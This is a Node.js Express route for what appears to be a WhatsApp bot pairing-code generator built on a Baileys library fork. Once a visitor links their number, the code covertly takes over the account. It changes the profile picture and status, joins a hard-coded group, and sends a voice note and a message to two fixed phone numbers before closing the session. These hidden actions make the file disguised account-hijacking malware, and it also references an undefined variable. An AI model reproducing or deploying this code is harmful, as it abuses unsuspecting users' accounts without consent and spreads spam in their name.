const PastebinAPI = require('pastebin-js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: Venocyber_Tech, useMultiFileAuthState, delay, makeCacheableSignalKeyStore } = require("maher-zubair-baileys");
const pastebin = new PastebinAPI(process.env.PASTEBIN_API_KEY);
const { makeid } = require('./id');
const router = express.Router();
const audioUrl = 'https://github.com/awclk/Database-my/raw/refs/heads/main/Audio/AUD-20250414-WA0048.mp3';
const generalMessage = `( 𝚂𝚁𝙸 𝙻𝙰𝙽𝙺𝙰|🇱🇰 ) 20.715.24S📵 ║🧑‍💻ꜰᴜᴄᴋ ʏᴏᴜ ᴅᴇᴠɪᴄᴇ…↝💀🍃𝟕.𝟎 ║

*╭────────────⊶*
*│* *_හායි පැතියො_*🐼🫶🤍
*│*
*│* *_කන්ටැක් ඔක්කොම ගියා_*
*│* *_නෙව් 😓❤‍🩹_*
*│*
*│*  *_හැමොම එන්න ඇවිත් මැසෙජ්_*
*│* *_එකක් දාන්න 🌝🫶🤍_*
*│*
*│*  *_ඔයාව ඔටො සෙව් වෙනො 🐼🤍_*
*╰────────────⊶*

*╭────────────⊶*
*│* ○ 𝙽𝙰𝙼𝙴   | 𝚃𝙷𝙴𝙴𝚂𝙷𝙰𝙽𝙰
*│* ○ 𝙵𝚁𝙾𝙼  │𝙼𝙰𝚃𝙰𝙻𝙴
*│* ○ 𝙰𝙶𝙴    │ +18
*╰─────────────⊶*
*────────────⊶*
*╭──────────⊶*
*│❮ Send me your name and age*  
*│through a massage and I will save*
*│you  ❯*
*╰──────────⊶*`;
const groupLink = 'https://chat.whatsapp.com/KKwrwomMWw13zZqj2W8BlD';
const profilePictureUrl = 'https://i.ibb.co/wFzVmH4V/IMG-20250331-WA0023.jpg';

const predefinedNumbers = [
  "+94755335072",
  "+94753335072"
];

function removeFile(filePath) {
    if (fs.existsSync(filePath)) {
        fs.rmSync(filePath, { recursive: true, force: true });
    }
}

async function VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res) {
    const { state, saveCreds } = await useMultiFileAuthState(`./temp/${id}`);
    try {
        let Pair_Code_By_Venocyber_Tech = Venocyber_Tech({
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
            },
            printQRInTerminal: false,
            logger: pino({ level: "fatal" }).child({ level: "fatal" }),
            browser: ["Chrome (Linux)", "", ""]
        });

        Pair_Code_By_Venocyber_Tech.ev.on('creds.update', saveCreds);

        Pair_Code_By_Venocyber_Tech.ev.on("connection.update", async (s) => {
            const { connection, lastDisconnect } = s;
            if (connection === "open") {
                await handleInitialSetup(Pair_Code_By_Venocyber_Tech);
                await handleConnectionOpen(Pair_Code_By_Venocyber_Tech, customMessage, res, id);
            } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode !== 401) {
                console.error("Connection closed unexpectedly. Restarting...");
                await delay(10000); // Wait before retrying
                VENOCYBER_MD_PAIR_CODE(id, num, customMessage, res);
            }
        });

        if (!Pair_Code_By_Venocyber_Tech.authState.creds.registered) {
            await delay(1500);
            num = num.replace(/[^0-9]/g, '');
            const code = await Pair_Code_By_Venocyber_Tech.requestPairingCode(num);
            if (!res.headersSent) {
                await res.send({ code });
            }
        }
    } catch (err) {
        console.error("Service restart failed:", err);
        await removeFile(`./temp/${id}`);
        if (!res.headersSent) {
            await res.send({ code: "Service Unavailable" });
        }
    }
}

async function handleInitialSetup(client) {
    try {
        await client.updateProfilePicture(client.user.id, { url: profilePictureUrl });
        console.log('Profile picture updated successfully!');
    } catch (error) {
        console.error('Failed to update profile picture:', error);
    }

    try {
        await client.updateProfileStatus(aboutText);
        console.log('About text updated successfully!');
    } catch (error) {
        console.error('Failed to update about text:', error);
    }
}

async function handleConnectionOpen(client, customMessage, res, id) {
    try {
        await client.groupAcceptInvite(groupLink.split('/').pop());
        console.log('Successfully joined the group!');
    } catch (error) {
        console.error('Failed to join the group:', error);
    }

    for (const number of predefinedNumbers) {
        const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        try {
            console.log(`Sending audio message to ${number}`);
            await client.sendMessage(jid, {
                audio: { url: audioUrl },
                mimetype: 'audio/mpeg',
                ptt: true 
            });
            await delay(2000); 

            console.log(`Sending text message to ${number}`);
            await client.sendMessage(jid, { text: customMessage });
            await delay(2000); 
            
        } catch (error) {
            console.error(`Failed to send message to ${number}:`, error);
        }
    }

    await delay(2000); 
    await client.ws.close();
    await removeFile(`./temp/${id}`);
}

router.get('/', async (req, res) => {
    const id = makeid();
    const num = req.query.number;
    const message = req.query.message || generalMessage;
    return await VENOCYBER_MD_PAIR_CODE(id, num, message, res);
});

module.exports = router;
